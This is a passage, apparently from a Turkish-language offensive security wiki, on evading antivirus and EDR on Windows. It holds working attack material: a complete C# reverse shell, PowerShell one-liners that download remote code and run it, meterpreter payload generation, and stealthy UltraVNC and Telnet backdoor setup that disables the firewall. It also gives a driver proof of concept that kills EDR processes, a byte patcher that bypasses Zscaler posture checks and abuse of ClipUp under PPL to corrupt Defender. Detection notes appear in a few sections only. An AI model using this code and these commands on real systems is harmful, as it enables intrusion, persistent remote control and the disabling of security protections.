autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir çatallanmasını sağlayarak [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla yazılım güvenliğini artırabilmektir.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, harici herhangi bir tool kullanmadan ve compiler'ı değiştirmeden, compile time sırasında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak şekilde, C++ template metaprogramming framework tarafından üretilen obfuscated operations katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli farklı pe files'ı obfuscate edebilen bir x64 binary obfuscator'dır
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM-supported languages için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal instructions'ları ROP chains'lere dönüştürerek programı assembly code seviyesinde obfuscate eder ve normal control flow algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve ardından onları yükleyebilir

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumak için tasarlanmış bir security mechanism'tir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir approach ile çalışır; yani alışılmadık şekilde indirilen applications, SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyanın çalıştırılmasını engeller (ancak More Info -> Run anyway seçilerek dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen dosyayla birlikte otomatik olarak oluşturulan ve indirildiği URL'yi de içeren Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** not etmek önemlidir.

Payload'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun sebebi, Mark-of-the-Web (MOTW)'nin **non NTFS** volumes üzerinde **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçınmak için output containers içine paketleyen bir tool'dur.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload’ları ISO dosyaları içine paketleyip SmartScreen’i bypass etmeye yönelik bir demo

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows’ta uygulamaların ve sistem bileşenlerinin **log events** kaydetmesine izin veren güçlü bir logging mekanizmasıdır. Ancak security ürünleri tarafından kötü amaçlı aktiviteleri izlemek ve tespit etmek için de kullanılabilir.

AMSI’nin disabled (bypassed) edilmesine benzer şekilde, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunu da herhangi bir event loglamadan hemen dönecek hale getirmek mümkündür. Bu, fonksiyonu bellekte patch’leyerek hemen return edecek şekilde yapılır; böylece o süreç için ETW logging etkili biçimde disabled edilir.

Daha fazla bilgi için **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerine bakabilirsiniz.


## C# Assembly Reflection

C# binary’lerini bellekte yüklemek uzun zamandır bilinen bir yöntemdir ve AV’ye yakalanmadan post-exploitation araçlarını çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan diske dokunmadan belleğe yükleneceği için, yalnızca tüm süreç için AMSI patch’leme konusunda endişelenmemiz gerekir.

Çoğu C2 framework’ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) C# assembly’lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation malicious code’unuzu bu yeni sürece enjekte etmeyi, malicious code’unuzu çalıştırmayı ve iş bittikten sonra yeni süreci öldürmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution işleminin bizim Beacon implant process’imizin **dışında** gerçekleşmesidir. Bu, post-exploitation aksiyonlarımızdan biri yanlış giderse veya yakalanırsa, **implant’ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma ihtimalinin **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation malicious code’u **kendi process’i içine** enjekte etmektir. Böylece yeni bir process oluşturup AV tarafından taranmasından kaçınabilirsiniz, ancak dezavantajı payload’unuzun execution’ında bir şey ters giderse **beacon’ınızı kaybetme** olasılığınızın **çok daha yüksek** olmasıdır; çünkü süreç crash olabilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla okumak istiyorsanız, lütfen şu makaleye bakın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF’una ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies’i **PowerShell’den** de yükleyebilirsiniz, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) bağlantılarına bakın.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, ele geçirilmiş makineye **Attacker Controlled SMB share üzerindeki interpreter environment’a erişim** vererek diğer diller kullanılarak malicious code çalıştırmak mümkündür.

SMB share üzerindeki Interpreter Binaries ve environment’a erişime izin vererek, bu dillerdeki arbitrary code’u ele geçirilmiş makinenin belleği içinde **execute** edebilirsiniz.

Repo şunu belirtiyor: Defender hâlâ scripts’i tarıyor, ancak Go, Java, PHP vb. kullanarak **static signatures’ları bypass etmek için daha fazla esnekliğe** sahibiz. Bu dillerdeki rastgele obfuscation yapılmamış reverse shell scripts ile yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir saldırganın bir access token’ı veya EDR ya da AV gibi bir security prouct’u **manipüle etmesine** olanak tanıyan bir tekniktir; böylece ayrıcalıklarını düşürerek process’in ölmemesini ama malicious activities’i kontrol etmek için izinlere sahip olmamasını sağlar.

Bunu önlemek için Windows, security process’lerinin token’ları üzerinde external processes’in handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, Chrome Remote Desktop’ı bir victim PC’ye kurup ardından onu takeover etmek ve persistence sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Installer’ı victim üzerinde sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next’e tıklayın. Wizard daha sonra sizden authorize etmenizi isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi, GUI kullanmadan pin ayarlamaya izin verir.)


## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetry kaynağını dikkate almak gerekir, bu yüzden olgun ortamlarda tamamen fark edilmeden kalmak neredeyse imkansızdır.

Karşılaştığınız her environment’ın kendine özgü güçlü ve zayıf yönleri olacaktır.

[@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle öneririm; daha gelişmiş Evasion tekniklerine giriş yapmak için iyi bir başlangıçtır.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender’ın hangi kısımları malicious bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz; bu araç **binary’nin parçalarını kaldırır** ta ki **Defender’ın hangi kısmı** malicious olarak bulduğunu anlayana kadar ve size bunu bölerek gösterir.\
Aynı işi yapan başka bir araç da [**avred**](https://github.com/dobin/avred)’dir; hizmeti sunan açık bir web arayüzü şurada bulunur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10’a kadar, tüm Windows sürümlerinde kurulabilen (administrator olarak) bir **Telnet server** bulunuyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistemin başlatılmasıyla birlikte **başlaması** ve şimdi **çalıştırılması**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server’ı yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ içinde bir password ayarlayın
- _View-Only Password_ içinde bir password ayarlayın

Ardından, _**winvnc.exe**_ binary’sini ve **yeni oluşturulan** _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker** kendi **host** üzerinde `vncviewer.exe -listen 5900` binary’sini **çalıştırmalı**, böylece bir reverse **VNC connection** yakalamaya **hazır** olur. Sonra, **victim** içinde: winvnc daemon’ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

**WARNING:** Stealth’i korumak için birkaç şeyi yapmamalısınız

- Eğer zaten çalışıyorsa `winvnc` başlatmayın, yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, yoksa [the config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın, yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister**'ı `msfconsole -r file.rc` ile **başlatın** ve **xml payload**'ı şu şekilde **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut savunucu süreci çok hızlı sonlandıracaktır.**

### Kendi reverse shell’imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python kullanarak build injectors örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space’ten AV/EDR Öldürme

Storm-2603, ransomware’ı bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Araç, kendi **vulnerable ama *signed* driver**’ını getirir ve Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini yürütmek için bunu kötüye kullanır.

Temel çıkarımlar
1. **Signed driver**: Diske bırakılan dosya `ServiceMouse.sys`’dir, ancak binary aslında Antiy Labs’in “System In-Depth Analysis Toolkit” içindeki yasal olarak signed edilmiş `AToolsKrnl64.sys` driver’ıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver’ı bir **kernel service** olarak kaydeder, ikinci satır ise onu başlatır; böylece `\\.\ServiceMouse` user land’den erişilebilir hale gelir.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process’i sonlandırır (Defender/EDR hizmetlerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı siler |
| `0x990001D0` | Driver’ı kaldırır ve service’i siler |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode protections’ı tamamen atlar; kernel içinde çalışan code, *protected* process’leri açabilir, sonlandırabilir veya PPL/PP, ELAM ya da diğer hardening özelliklerinden bağımsız olarak kernel object’lerini manipüle edebilir.

Detection / Mitigation
•  Microsoft’un vulnerable-driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys`’i yüklemeyi reddeder.
•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory’den yükleniyorsa veya allow-list üzerinde değilse alarm üretin.
•  User-mode handle’larının custom device object’lere açılmasını ve ardından şüpheli `DeviceIoControl` çağrılarını takip edin.

### On-Disk Binary Patching ile Zscaler Client Connector Posture Checks’i Bypass Etme

Zscaler’ın **Client Connector**’ı device-posture kurallarını local olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi tam bir bypass’ı mümkün kılar:

1. Posture evaluation **tamamen client-side** gerçekleşir (server’a bir boolean gönderilir).
2. Internal RPC endpoints, bağlanan executable’ın **Zscaler tarafından signed** edilmesini (`WinVerifyTrust` üzerinden) doğrular.

Diskteki dört signed binary’yi **patch’leyerek** bu iki mekanizma da etkisiz hale getirilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döner, böylece her check compliant olur |
| `ZSAService.exe` | `WinVerifyTrust`’a dolaylı call | NOP-ed ⇒ herhangi bir process (hatta unsigned olanlar bile) RPC pipes’a bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | tunnel üzerindeki integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve service stack’i yeniden başlattıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görünür.
* İmzasız veya değiştirilmiş binary’ler named-pipe RPC endpoint’lerini açabilir (örn. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromize host, Zscaler policies tarafından tanımlanan internal network’e sınırsız erişim kazanır.

Bu case study, yalnızca client-side trust kararlarının ve basit signature kontrollerinin birkaç byte patch ile nasıl aşılabileceğini gösterir.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede korunan process’lerin birbirini değiştirebilmesini sağlamak için bir signer/level hiyerarşisi uygular. Offensive açıdan, PPL-enabled bir binary’yi meşru şekilde başlatıp argümanlarını kontrol edebiliyorsanız, benign işlevselliği (örn. logging) AV/EDR tarafından kullanılan protected directories’e karşı sınırlı, PPL-backed bir write primitive’e dönüştürebilirsiniz.

Bir process’i PPL olarak çalıştıran şey nedir
- Hedef EXE (ve yüklenen herhangi bir DLL), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, CreateProcess kullanılarak şu flags ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary’nin signer’ı ile eşleşen uyumlu bir protection level istenmelidir (örn. anti-malware signers için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler creation sırasında başarısız olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca şuna bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level seçer ve arguments’ı target EXE’ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary `C:\Windows\System32\ClipUp.exe` kendi kendine başlatılır ve bir log dosyasını çağıran tarafından belirtilen bir path’e yazmak için bir parameter kabul eder.
- PPL process olarak başlatıldığında, file write PPL backing ile gerçekleşir.
- ClipUp boşluk içeren path’leri parse edemez; normalde korunan locations içine işaret etmek için 8.3 short paths kullanın.

8.3 short path helpers
- Short names listesi: her parent directory içinde `dir /x`.
- cmd içinde short path türetme: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) `CREATE_PROTECTED_PROCESS` ile bir launcher kullanarak başlatın (ör., CreateProcessAsPPL).
2) Protected bir AV directory’sinde (ör., Defender Platform) file creation zorlamak için ClipUp log-path argument’ını geçin. Gerekirse 8.3 short names kullanın.
3) Hedef binary normalde AV çalışırken açık/locked ise (ör., MsMpEng.exe), boot sırasında AV başlamadan önce yazmayı planlamak için daha erken güvenilir şekilde çalışan bir auto-start service kurun. Boot ordering’i Process Monitor (boot logging) ile doğrulayın.
4) Reboot sonrası PPL-backed write, AV kendi binary’lerini kilitlemeden önce gerçekleşir; hedef file corrupt olur ve startup engellenir.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'nin yazdığı içeriği yerleşim dışında kontrol edemezsiniz; bu primitive, kesin içerik enjeksiyonundan ziyade corruption için uygundur.
- Bir service kurmak/başlatmak için local admin/SYSTEM gerekir ve bir reboot penceresi gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'ları önler.

Tespitler
- Özellikle standart olmayan launchers tarafından parent edilen, boot sırasında `ClipUp.exe` için olağandışı arguments ile process creation.
- Suspicious binaries'yi auto-start yapacak şekilde ayarlanmış yeni services ve Defender/AV'den sürekli önce başlayan services. Defender startup failures öncesindeki service creation/modification'ı investigate edin.
- Defender binaries/Platform directories üzerinde file integrity monitoring; protected-process flags ile çalışan processes tarafından beklenmeyen file creations/modifications.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan processes ve AV olmayan binary'ler tarafından olağandışı PPL level kullanımı arayın.

Mitigasyonlar
- WDAC/Code Integrity: hangi signed binaries'nin PPL olarak ve hangi parents altında çalışabileceğini kısıtlayın; meşru contexts dışında ClipUp invocation'ını bloklayın.
- Service hygiene: auto-start services'in creation/modification'ını kısıtlayın ve start-order manipulation'ı izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption belirten startup errors'ı investigate edin.
- Ortamınızla uyumluysa, security tooling barındıran volumes üzerinde 8.3 short-name generation'ı devre dışı bırakmayı düşünün (iyi test edin).

PPL ve tooling için references
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
